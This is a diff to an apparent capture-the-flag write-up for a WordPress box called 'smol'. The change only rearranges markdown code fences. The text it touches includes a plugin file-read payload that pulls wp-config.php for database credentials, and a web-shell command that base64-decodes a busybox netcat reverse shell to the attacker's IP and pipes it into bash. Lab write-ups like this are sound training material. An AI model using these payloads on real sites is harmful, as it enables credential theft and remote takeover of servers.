@@ -342,10 +342,10 @@ Interesting Finding(s):
 ```
 
 ### **Web Access - wpuser   ;;    We use the SSRF example payload, read the wp-config and find the credentials for the database user wpuser.**
-
+```jsx
 [http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)
 
-```jsx
+
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 ```
 
@@ -627,9 +627,9 @@ www-data@smol:/var/www/wordpress/wp-admin$
 ```
 
 ### in login in to the page and change the URL to RUN the command
-
+```jsx
 [http://www.smol.thm/wp-admin/index.php?cmd=echo](http://www.smol.thm/wp-admin/index.php?cmd=echo) YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash
-
+```
 ## Privilege Escalation
 
 ### To gain user access >>   mysql -u wpuser -p
